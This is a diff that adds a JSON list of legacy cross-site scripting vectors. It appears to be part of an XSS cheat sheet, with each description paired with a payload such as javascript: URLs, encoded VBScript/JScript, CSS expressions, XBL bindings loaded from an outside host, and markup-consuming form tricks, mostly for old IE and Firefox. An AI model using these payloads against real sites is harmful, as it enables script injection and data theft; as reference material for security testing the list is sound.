@@ -1,0 +1,92 @@
+[
+    {
+        "description": "Image src with JavaScript protocol",
+        "code": "<img src=\"javascript:alert(1)\">",
+        "browsers": []
+    },
+    {
+        "description": "Body background with JavaScript protocol",
+        "code": "<body background=\"javascript:alert(1)\">",
+        "browsers": []
+    },
+    {
+        "description": "Iframe data urls no longer work as modern browsers use a null origin",
+        "code": "<iframe src=\"data:text\/html,<img src=1 onerror=alert(document.domain)>\">",
+        "browsers": []
+    },
+    {
+        "description": "VBScript protocol used to work in IE",
+        "code": "<a href=\"vbscript:MsgBox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"vbs:Msgbox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"VBS:Msgbox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"vbscript:Msgbox+1\">XSS<\/a>\n<a href=\"#\" onclick=\"VBSCRIPT:Msgbox+1\">XSS<\/a>\n<a href=\"#\" language=vbs onclick=\"vbscript:Msgbox+1\">XSS<\/a>",
+        "browsers": []
+    },
+    {
+        "description": "JScript compact was a minimal version of JS that wasn't widely used in IE",
+        "code": "<a href=\"#\" onclick=\"jscript.compact:alert(1);\">test<\/a>\n<a href=\"#\" onclick=\"JSCRIPT.COMPACT:alert(1);\">test<\/a>",
+        "browsers": []
+    },
+    {
+        "description": "JScript.Encode allows encoded JavaScript",
+        "code": "<a href=# language=\"JScript.Encode\" onclick=\"#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS<\/a>\n<a href=# onclick=\"JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@\">XSS<\/a>",
+        "browsers": []
+    },
+    {
+        "description": "VBScript.Encoded allows encoded VBScript",
+        "code": "<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>\n<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>",
+        "browsers": []
+    },
+    {
+        "description": "JavaScript entities used to work in Netscape Navigator",
+        "code": "<a title=\"&{alert(1)}\">XSS<\/a>",
+        "browsers": []
+    },
+    {
+        "description": "JavaScript stylesheets used to be supported by Netscape Navigator",
+        "code": "<link href=\"xss.js\" rel=stylesheet type=\"text\/javascript\">",
+        "browsers": []
+    },
+    {
+        "description": "Button used to consume markup",
+        "code": "<form><button name=x formaction=x><b>stealme",
+        "browsers": []
+    },
+    {
+        "description": "IE9 select elements and plaintext used to consume markup",
+        "code": "<form action=x><button>XSS<\/button><select name=x><option><plaintext><script>token=\"supersecret\"<\/script>",
+        "browsers": []
+    },
+    {
+        "description": "XBL Firefox only <= 2",
+        "code": "<div style=\"-moz-binding:url(\/\/businessinfo.co.uk\/labs\/xbl\/xbl.xml#xss)\">\n<div style=\"\\-\\mo\\z-binding:url(\/\/businessinfo.co.uk\/labs\/xbl\/xbl.xml#xss)\">\n<div style=\"-moz-bindin\\67:url(\/\/businessinfo.co.uk\/lab s\/xbl\/xbl.xml#xss)\">\n<div style=\"-moz-bindin&#x5c;67:url(\/\/businessinfo.co.uk\/lab s\/xbl\/xbl.xml#xss)\">",
+        "browsers": []
+    },
+    {
+        "description": "XBL also worked in FF3.5 using data urls",
+        "code": "<img src=\"blah\" style=\"-moz-binding: url(data:text\/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A\/\/www.mozilla.org\/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C\/constructor%3E%3C\/implementation%3E%3C\/ binding%3E%3C\/bindings%3E)\" \/>",
+        "browsers": []
+    },
+    {
+        "description": "CSS expressions <=IE7",
+        "code": "<div style=xss:expression(alert(1))>\n<div style=xss:expression(1)-alert(1)>\n<div style=xss:expressio\\6e(alert(1))>\n<div style=xss:expressio\\006e(alert(1))>\n<div style=xss:expressio\\00006e(alert(1))>\n<div style=xss:expressio\\6e(alert(1))>\n<div style=xss:expressio&#x5c;6e(alert(1))>",
+        "browsers": []
+    },
+    {
+        "description": "In quirks mode IE allowed you to use = instead of :",
+        "code": "<div style=xss=expression(alert(1))>\n<div style=\"color&#x3dred\">test<\/div>",
+        "browsers": []
+    },
+    {
+        "description": "Behaviors for older modes of IE",
+        "code": "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\">XSS<\/a>",
+        "browsers": []
+    },
+    {
+        "description": "Older versions of IE supported event handlers in functions",
+        "code": "<script>\nfunction window.onload(){\nalert(1);\n}\n<\/script>\n<script>\nfunction window::onload(){\nalert(1);\n}\n<\/script>\n<script>\nfunction window.location(){\n}\n<\/script>\n<body>\n<script>\nfunction\/*<img src=1 onerror=alert(1)>*\/document.body.innerHTML(){}\n<\/script>\n<\/body>\n<body>\n<script>\nfunction document.body.innerHTML(){ x = \"<img src=1 onerror=alert(1)>\"; }\n<\/script>\n<\/body>",
+        "browsers": []
+    },
+    {
+        "description": "GreyMagic HTML+time exploit (no longer works even in 5 docmode)",
+        "code": "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> <\/BODY><\/HTML>",
+        "browsers": []
+    }
+]
